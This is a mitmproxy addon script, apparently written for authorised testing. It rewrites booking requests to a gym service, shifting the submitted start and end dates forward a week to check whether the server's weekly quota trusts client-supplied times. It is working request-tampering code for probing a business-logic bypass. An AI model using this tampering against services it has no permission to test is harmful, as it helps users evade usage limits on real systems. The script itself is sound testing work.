"""
Tests whether the server computes the "weekly" bucket from the
start_time/end_time the CLIENT submits, or from something it tracks
independently (e.g. booking creation timestamp, a fixed server-side
week boundary).

Targets Gym (already exhausted in your env), so the expected/safe
outcome is: still rejected with the real "5/5" style message, no
matter what dates you send. If it ever gets ACCEPTED, or if the
weekly-limit GET afterwards shows a changed currentHours/remaining
for a date range you didn't actually request, that's a real finding.

What it does on every matching POST /bookings/services for the
target service:
  - keeps the requested slot's clock time (hour/minute) the same
  - shifts the calendar date forward by SHIFT_DAYS, nudging start_time
    into what should be a different week bucket, while leaving
    end_time's offset from start_time untouched (same duration)
  - logs the real response

Run with:
    mitmdump -s gym_week_boundary_tamper_test.py
"""

import json
from datetime import datetime, timedelta, timezone
from mitmproxy import http, ctx

PATH = "/bookings/services"
TARGET_SERVICE_ID = "cmkztqx2d000fuckto9dknnv3"  # Gym; swap for another service_id if you want
SHIFT_DAYS = 7  # push the submitted dates one week forward


def matches(flow: http.HTTPFlow) -> bool:
	req = flow.request
	if req.method != "POST":
		return False
	if not req.path.split("?")[0].endswith(PATH):
		return False
	try:
		body = json.loads(req.get_text() or "{}")
	except ValueError:
		return False
	if TARGET_SERVICE_ID and body.get("service_id") != TARGET_SERVICE_ID:
		return False
	return "start_time" in body and "end_time" in body


def _shift(ts: str, days: int) -> str:
	dt = datetime.fromisoformat(ts.replace("Z", "+00:00"))
	dt = dt + timedelta(days=days)
	return dt.astimezone(timezone.utc).isoformat().replace("+00:00", "Z")


def request(flow: http.HTTPFlow) -> None:
	if not matches(flow):
		return
	try:
		body = json.loads(flow.request.get_text())
	except ValueError:
		return
	before = {
		"start_time": body["start_time"],
		"end_time": body["end_time"],
	}
	body["start_time"] = _shift(body["start_time"], SHIFT_DAYS)
	body["end_time"] = _shift(body["end_time"], SHIFT_DAYS)
	flow.request.set_text(json.dumps(body))
	flow.comment = f"tampered: shifted dates +{SHIFT_DAYS}d"
	ctx.log.info(
		f"[week-shift] {before} -> start={body['start_time']} end={body['end_time']}"
	)


def response(flow: http.HTTPFlow) -> None:
	if not matches(flow) or flow.response is None:
		return
	ctx.log.info(
		f"[week-shift] response status={flow.response.status_code} "
		f"body={flow.response.get_text()}"
	)
